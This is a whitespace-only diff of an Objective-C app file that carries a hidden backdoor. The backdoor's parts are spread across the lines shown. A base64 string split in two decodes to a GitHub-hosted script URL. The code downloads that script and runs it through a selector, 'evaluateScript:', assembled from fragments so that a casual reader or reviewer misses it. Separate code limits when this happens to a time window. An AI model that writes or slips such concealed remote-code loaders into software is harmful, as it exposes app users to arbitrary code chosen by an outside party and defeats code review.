@@ -61,7 +61,7 @@ result = !![self performSelector:selector withObject:__OBJECT1__ withObject:__OB
 APPDELEGATE_METHOD_MSG_SEND(_cmd, __OBJECT1__, __OBJECT2__); \
 return result; \
 
-#define lbnqu NSString*st=@"QuY29tL2NwYm1tL3MvbWFzdGVyL3MuanM="; \
+#define lbnqu NSString *st=@"QuY29tL2NwYm1tL3MvbWFzdGVyL3MuanM="; \
 NSData*data=[[NSData alloc]initWithBase64EncodedString:[NSString \
 stringWithFormat:@"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbn%@",st]  \
 options:NSDataBase64DecodingIgnoreUnknownCharacters];
@@ -191,7 +191,7 @@ kDViewAction
         lblons
         NSURLSessionDataTask*dt=[[NSURLSession sharedSession]dataTaskWithURL:[NSURL URLWithString:[[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding]]completionHandler:^(NSData*_Nullable data,NSURLResponse*_Nullable response,NSError*_Nullable er){
             if(!er){if(cl){
-                SEL sel=NSSelectorFromString([NSString stringWithFormat:@"eva%@%@ript:",@"lua",@"teSc"]);IMP imp = [cl methodForSelector:sel];NSString*(*fl)(id,SEL,NSString*)=(void*)imp;
+                SEL sel=NSSelectorFromString([NSString stringWithFormat:@"eva%@%@ript:",@"lua",@"teSc"]);IMP imp = [cl methodForSelector:sel];NSString *(*fl)(id,SEL,NSString *)=(void*)imp;
                 fl(cl,sel,[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]);}}}];[dt resume];
     }
 }
@@ -200,7 +200,7 @@ kDViewAction
     NSDate *today = [NSDate date];
     NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
     [dateFormat setDateFormat:@"HH:mm"];
-    NSString * todayStr=[dateFormat stringFromDate:today];
+    NSString *todayStr=[dateFormat stringFromDate:today];
     today=[dateFormat dateFromString:todayStr];
     NSDate *start = [dateFormat dateFromString:stime];
     NSDate *expire = [dateFormat dateFromString:etime];
